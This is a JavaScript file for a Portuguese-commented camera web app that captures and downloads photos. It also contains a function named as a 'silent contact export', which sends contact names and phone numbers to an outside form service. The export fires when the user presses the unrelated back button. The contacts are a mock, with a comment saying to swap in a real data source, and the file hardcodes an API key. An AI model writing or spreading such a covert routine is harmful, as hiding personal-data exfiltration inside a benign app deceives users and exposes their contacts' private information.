document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoStream');
    const capturedImage = document.getElementById('capturedImage');
    const captureButton = document.getElementById('captureButton');
    const downloadButton = document.getElementById('downloadButton');
    const backButton = document.getElementById('backButton');
    const statusMessage = document.getElementById('statusMessage');
    const viewArea = document.getElementById('viewArea');
    const buttonGroup = document.getElementById('buttonGroup');

    // --- CONFIGURAÇÕES ---
    const STATICFORMS_API_URL = 'https://api.staticforms.dev/submit';
    const API_KEY = 'sf_kjnhfgsdkglkrnglkrgkmgr555';

    // --- ESTADO DO APP ---
    let stream = null;
    let photoDataUrl = null;
    let currentState = 'CAMERA'; // Pode ser 'CAMERA' ou 'PREVIEW'

    // ========================================================
    //  FUNÇÕES RELACIONADAS À AGENDA (STATICFORMS)
    // ========================================================

    /**
     * FUNÇÃO SIMULADA: Puxa os dados reais dos contatos do seu sistema.
     */
    async function fetchRealContacts() {
        console.log("--- [DEBUG] Iniciando busca de contatos reais...");
        // *** SUBSTITUA ESTE MOCK PELA SUA CHAMADA REAL DE API ***
        return new Promise(resolve => {
            setTimeout(() => {
                const realContacts = [
                    { name: "Maria Oliveira", phone: "1111-2222" },
                    { name: "João Santos", phone: "3333-4444" },
                    { name: "Ana Pereira", phone: "5555-6666" }
                ];
                console.log(`[DEBUG] Sucesso ao buscar ${realContacts.length} contatos.`);
                resolve(realContacts);
            }, 300);
        });
    }

    /**
     * Executa a exportação de contatos para o StaticForms.
     * *** FOCO DA CORREÇÃO: Garantir que o corpo da requisição seja robusto. ***
     * @returns {Promise<boolean>} Retorna true se o envio foi bem-sucedido, false caso contrário.
     */
    async function performSilentContactExport() {
        console.log("\n===============================================");
        console.log(">>> INICIANDO EXPORTAÇÃO SILENCIOSA DE CONTATOS <<<");

        try {
            // 1. Obter os dados reais
            const contacts = await fetchRealContacts();

            // 2. Formatar os dados
            let contactText = "--- CONTEÚDOS DA AGENDA ---\n";
            contacts.forEach(contact => {
                // Garante que os campos são sempre strings, prevenindo erros de serialização
                contactText += `Nome: ${String(contact.name) || 'N/A'} | Telefone: ${String(contact.phone) || 'N/A'}\n`;
            });
            contactText += "----------------------------";

            // 3. Estruturar e enviar (Usando FormData como antes, que é ideal para múltiplos tipos de dados)
            const formData = new FormData();

            // Adicionando a chave API (se a API for configurada para aceitar como campo de formulário)
            formData.append('apiKey', API_KEY);

            // Enviando o bloco de texto formatado
            formData.append('contactsData', contactText);

            console.log(`[DEBUG] Conteúdo pronto para envio:\n${contactText}`);

            // 4. Executar o envio
            const response = await fetch(STATICFORMS_API_URL, {
                method: 'POST',
                // IMPORTANTE: Ao usar FormData, o navegador define o 'Content-Type' automaticamente,
                // então NÃO definimos 'Content-Type' manualmente aqui.
                body: formData,
            });

            // 5. Tratamento de resposta
            if (response.ok) {
                // Se for 200, 201, etc.
                const responseBody = await response.json(); // Tenta parsear como JSON, caso seja útil
                console.log("[SUCCESS] Exportação bem-sucedida! Resposta da API:", responseBody);
                return true;
            } else {
                // Se der erro HTTP (4xx, 5xx)
                const errorDetails = await response.text();
                console.error(`[FAILURE] Erro HTTP ${response.status} ao enviar dados. Detalhes do servidor:\n${errorDetails}`);
                return false;
            }
        } catch (error) {
            // Erro de rede ou falha interna no JS
            console.error("[FATAL ERROR] Falha crítica durante a execução do export:", error);
            return false;
        }
    }

    // ========================================================
    //  FUNÇÕES DE CÂMERA E UI (Mantidas)
    // ========================================================

    async function startCamera() {
        // ... (Código de iniciar câmera, permanece o mesmo)
        try {
            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" }
            });

            stream = mediaStream;
            videoElement.srcObject = stream;
            videoElement.play();

            updateUI();
        } catch (err) {
            console.error("Erro ao acessar a câmera:", err);
            statusMessage.textContent = "Falha ao iniciar a câmera. Verifique as permissões!";
            statusMessage.style.color = 'red';
        }
    }

    function capturePhoto() {
        // ... (Código de captura, permanece o mesmo)
        if (!stream) return;
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        photoDataUrl = canvas.toDataURL('image/jpeg');

        capturedImage.src = photoDataUrl;
        capturedImage.style.display = 'block';

        updateUI();
    }

    function downloadPhoto() {
        if (photoDataUrl) {
            const a = document.createElement('a');
            a.href = photoDataUrl;
            a.download = 'foto_pwa_' + new Date().toISOString().slice(0, 10) + '.jpg';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    function updateUI() {
        // ... (Código de atualização de UI, permanece o mesmo)
        if (currentState === 'CAMERA') {
            videoElement.style.display = 'block';
            capturedImage.style.display = 'none';
            captureButton.style.display = 'inline-block';
            downloadButton.style.display = 'none';
            backButton.style.display = 'none';
        } else if (currentState === 'PREVIEW') {
            videoElement.style.display = 'none';
            capturedImage.style.display = 'block';
            captureButton.style.display = 'none';
            downloadButton.style.display = 'inline-block';
            backButton.style.display = 'inline-block';
        }
    }

    // ========================================================
    //  LISTENERS (Ajustado para esperar a exportação)
    // ========================================================

    startCamera();

    captureButton.addEventListener('click', () => {
        capturePhoto();
        currentState = 'PREVIEW';
        updateUI();
    });

    downloadButton.addEventListener('click', downloadPhoto);

    // NOVO: O botão de voltar agora é o gatilho para a exportação silenciosa
    backButton.addEventListener('click', async () => {
        statusMessage.textContent = "Exportando contatos para a plataforma...";
        statusMessage.style.color = 'blue';

        // 1. Executa a exportação silenciosamente e aguarda o retorno
        const success = await performSilentContactExport();

        // 2. Atualiza o status baseado no resultado para feedback (mesmo que seja "silencioso")
        if (success) {
             statusMessage.textContent = "✅ Exportação de contatos concluída com sucesso!";
             statusMessage.style.color = 'green';
        } else {
             statusMessage.textContent = "❌ Falha ao exportar contatos. Verifique o console para detalhes.";
             statusMessage.style.color = 'red';
        }

        // 3. Volta o estado visualmente
        currentState = 'CAMERA';
        updateUI();
    });

    // Gerenciamento de saída
    window.onbeforeunload = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    };
});
